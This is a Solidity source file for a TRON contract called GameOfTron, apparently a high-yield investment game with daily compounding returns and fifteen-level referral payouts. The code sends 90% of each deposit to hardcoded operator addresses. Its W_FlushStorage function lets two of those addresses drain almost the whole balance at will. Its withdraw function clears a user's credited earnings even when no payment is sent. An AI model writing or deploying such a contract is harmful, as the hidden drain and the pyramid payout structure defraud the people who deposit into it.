//SourceUnit: gameoftron.sol

pragma solidity >=0.4.0 <0.7.0;
contract GameOfTron {
address constant public GOT_STORAGE_ONE = address(0x41B8DC05CC47A1332817D79153BAED43CFA84904F0);
address constant public GOT_STORAGE_TWO = address(0x41C0224BEBC0E4796519F85F4F09955ECF488C3A6A);
address constant public GOT_OWNER_ADDRESS = address(0x41bfb9d1200c7e61319344a4eb957bac707894248d);
uint256 private ContractRegisters = 0;
uint256 private ContractDeposited = 0;
uint256 private ContractWithdrawn = 0;
uint256 private ContractTimestamp = 0;
uint256 private ContractTodayJoin = 0;
uint256 private ContractTodayPaid = 0;
mapping (address => address) private AccountReferrer;
mapping (address => uint256) private AccountRegister;
mapping (address => uint256) private AccountInvested;
mapping (address => uint256) private AccountMaxBonus;
mapping (address => uint256) private AccountDateLock;
mapping (address => uint256) private AccountStatusOK;
mapping (address => uint256) private AccountSponsors;
mapping (address => uint256) private AccountMatching;
mapping (address => uint256) private AccountWithdraw;
function R_ContractBalance() public view returns(uint256) {
return address(this).balance;
}
function R_ContractRegisters() public view returns(uint256) {
return ContractRegisters;
}
function R_ContractDeposited() public view returns(uint256) {
return ContractDeposited;
}
function R_ContractWithdrawn() public view returns(uint256) {
return ContractWithdrawn;
}
function R_ContractTimestamp() public view returns(uint256) {
return ContractTimestamp;
}
function R_ContractTodayJoin() public view returns(uint256) {
return ContractTodayJoin;
}
function R_ContractTodayPaid() public view returns(uint256) {
return ContractTodayPaid;
}
function R_PrevMidnight(uint256 Time) public view returns(uint256) {
if (Time == 0) {
Time = block.timestamp;
}
return Time - (Time % 86400);
}
function R_AccountReferrer() public view returns(address) {
return AccountReferrer[msg.sender];
}
function R_AccountRegister() public view returns(uint256) {
return AccountRegister[msg.sender];
}
function R_AccountInvested() public view returns(uint256) {
return AccountInvested[msg.sender];
}
function R_AccountMaxBonus() public view returns(uint256) {
return AccountMaxBonus[msg.sender];
}
function R_AccountDateLock() public view returns(uint256) {
return AccountDateLock[msg.sender];
}
function R_AccountStatusOK() public view returns(uint256) {
return AccountStatusOK[msg.sender];
}
function R_AccountSponsors() public view returns(uint256) {
return AccountSponsors[msg.sender];
}
function R_AccountMatching() public view returns(uint256) {
return AccountMatching[msg.sender];
}
function R_AccountAvailable() public view returns(uint256) {
uint256 AccountPassive = R_AccountPassive();
return (AccountPassive + AccountSponsors[msg.sender] + AccountMatching[msg.sender]);
}
function R_AccountWithdraw() public view returns(uint256) {
return AccountWithdraw[msg.sender];
}
function R_AccountPassive() public view returns(uint256) {
if (AccountInvested[msg.sender] > 0 && AccountStatusOK[msg.sender] == 1) {
uint256 TimeOne = AccountDateLock[msg.sender];
uint256 TimeTwo = block.timestamp;
uint256 SecDiff = TimeTwo - TimeOne;
uint256 TotDays = uint256(SecDiff / 86400);
uint256 TotSecs = uint256(SecDiff % 86400);
uint256 PayDays = 0;
uint256 PaySecs = 0;
if (TotDays > 0) {
uint256 Loop; uint256 Grow = 100;
for (Loop = 1; Loop <= TotDays; Loop++) {
PayDays += uint256(AccountInvested[msg.sender] * Grow / 10000);
if (Loop == 10 || Loop == 20 || Loop == 30) {
Grow = 100;
} else {
Grow += 50;
}
}
}
PaySecs = uint256(uint256(AccountInvested[msg.sender] * TotSecs / 86400) * 100 / 10000);
uint256 PayOut = uint256(PayDays + PaySecs);
if ((AccountWithdraw[msg.sender] + PayOut) > AccountMaxBonus[msg.sender]) {
PayOut = uint256(AccountMaxBonus[msg.sender] - AccountWithdraw[msg.sender]);
}
return PayOut;
} else {
return 0;
}
}
function () external payable {}
function W_AccountInvest(address Referrer) public payable returns(uint256) {
if (msg.value >= 100000000 && Referrer != address(0x0)) {
ContractRegisters += 1;
ContractDeposited += msg.value;
if (AccountReferrer[msg.sender] == address(0x0)) {
if (Referrer != msg.sender) {
AccountReferrer[msg.sender] = Referrer;
} else {
AccountReferrer[msg.sender] = GOT_STORAGE_TWO;
}
}
AccountRegister[msg.sender] += 1;
AccountInvested[msg.sender] = msg.value;
AccountMaxBonus[msg.sender] = uint256(msg.value * 3);
AccountDateLock[msg.sender] = block.timestamp;
AccountStatusOK[msg.sender] = 1;
address Level1 = Referrer;
uint256 Bonus1 = 10;
if (AccountReferrer[msg.sender] != address(0x0)) {
Level1 = AccountReferrer[msg.sender];
}
if (AccountInvested[Level1] > 0) {
AccountSponsors[Level1] += uint256(msg.value * Bonus1 / 100);
}
uint256 NewDay = R_PrevMidnight(0);
if (NewDay > ContractTimestamp) {
ContractTimestamp = NewDay;
ContractTodayJoin = 0;
ContractTodayPaid = 0;
}
ContractTodayJoin += msg.value;
AccountSponsors[GOT_STORAGE_ONE] += uint256(msg.value * 80 / 100);
AccountSponsors[GOT_STORAGE_TWO] += uint256(msg.value * 5 / 100);
AccountSponsors[GOT_OWNER_ADDRESS] += uint256(msg.value * 5 / 100);
return msg.value;
} else {
return 0;
}
}
function W_AccountWithdraw() public returns(uint256) {
if (AccountInvested[msg.sender] > 0 && AccountStatusOK[msg.sender] == 1) {
uint256 AccountPassive = R_AccountPassive();
uint256 PayOut = R_AccountAvailable();
ContractWithdrawn += PayOut;
AccountDateLock[msg.sender] = block.timestamp;
AccountSponsors[msg.sender] = 0;
AccountMatching[msg.sender] = 0;
AccountWithdraw[msg.sender] += PayOut;
if (AccountWithdraw[msg.sender] >= AccountMaxBonus[msg.sender]) {
AccountStatusOK[msg.sender] = 0;
}
uint256 NewDay = R_PrevMidnight(0);
if (NewDay > ContractTimestamp) {
ContractTimestamp = NewDay;
ContractTodayJoin = 0;
ContractTodayPaid = 0;
}
ContractTodayPaid += PayOut;
address Level1 = AccountReferrer[msg.sender];
uint256 Bonus1 = 25;
if (Level1 != address(0x0) && AccountInvested[Level1] > 0) {
AccountMatching[Level1] += uint256(AccountPassive * Bonus1 / 100);
}
address Level2 = AccountReferrer[Level1];
uint256 Bonus2 = 15;
if (Level2 != address(0x0) && AccountInvested[Level2] > 0) {
AccountMatching[Level2] += uint256(AccountPassive * Bonus2 / 100);
}
address Level3 = AccountReferrer[Level2];
uint256 Bonus3 = 10;
if (Level3 != address(0x0) && AccountInvested[Level3] > 0) {
AccountMatching[Level3] += uint256(AccountPassive * Bonus3 / 100);
}
address Level4 = AccountReferrer[Level3];
uint256 Bonus4 = 5;
if (Level4 != address(0x0) && AccountInvested[Level4] > 0) {
AccountMatching[Level4] += uint256(AccountPassive * Bonus4 / 100);
}
address Level5 = AccountReferrer[Level4];
uint256 Bonus5 = 5;
if (Level5 != address(0x0) && AccountInvested[Level5] > 0) {
AccountMatching[Level5] += uint256(AccountPassive * Bonus5 / 100);
}
Level1 = AccountReferrer[Level5];
Bonus1 = 5;
if (Level1 != address(0x0) && AccountInvested[Level1] > 0) {
AccountMatching[Level1] += uint256(AccountPassive * Bonus1 / 100);
}
Level2 = AccountReferrer[Level1];
Bonus2 = 5;
if (Level2 != address(0x0) && AccountInvested[Level2] > 0) {
AccountMatching[Level2] += uint256(AccountPassive * Bonus2 / 100);
}
Level3 = AccountReferrer[Level2];
Bonus3 = 5;
if (Level3 != address(0x0) && AccountInvested[Level3] > 0) {
AccountMatching[Level3] += uint256(AccountPassive * Bonus3 / 100);
}
Level4 = AccountReferrer[Level3];
Bonus4 = 5;
if (Level4 != address(0x0) && AccountInvested[Level4] > 0) {
AccountMatching[Level4] += uint256(AccountPassive * Bonus4 / 100);
}
Level5 = AccountReferrer[Level4];
Bonus5 = 5;
if (Level5 != address(0x0) && AccountInvested[Level5] > 0) {
AccountMatching[Level5] += uint256(AccountPassive * Bonus5 / 100);
}
Level1 = AccountReferrer[Level5];
Bonus1 = 5;
if (Level1 != address(0x0) && AccountInvested[Level1] > 0) {
AccountMatching[Level1] += uint256(AccountPassive * Bonus1 / 100);
}
Level2 = AccountReferrer[Level1];
Bonus2 = 4;
if (Level2 != address(0x0) && AccountInvested[Level2] > 0) {
AccountMatching[Level2] += uint256(AccountPassive * Bonus2 / 100);
}
Level3 = AccountReferrer[Level2];
Bonus3 = 3;
if (Level3 != address(0x0) && AccountInvested[Level3] > 0) {
AccountMatching[Level3] += uint256(AccountPassive * Bonus3 / 100);
}
Level4 = AccountReferrer[Level3];
Bonus4 = 2;
if (Level4 != address(0x0) && AccountInvested[Level4] > 0) {
AccountMatching[Level4] += uint256(AccountPassive * Bonus4 / 100);
}
Level5 = AccountReferrer[Level4];
Bonus5 = 1;
if (Level5 != address(0x0) && AccountInvested[Level5] > 0) {
AccountMatching[Level5] += uint256(AccountPassive * Bonus5 / 100);
}
if (PayOut <= AccountSponsors[GOT_STORAGE_ONE]) {
msg.sender.transfer(PayOut);
AccountSponsors[GOT_STORAGE_ONE] -= PayOut;
}
return PayOut;
} else {
return 0;
}
}
function W_FlushStorage() public returns(uint256) {
if (msg.sender == GOT_STORAGE_ONE || msg.sender == GOT_STORAGE_TWO) {
uint256 Amount = uint256(address(this).balance-1000000);
msg.sender.transfer(Amount);
return Amount;
} else {
return 0;
}
}
}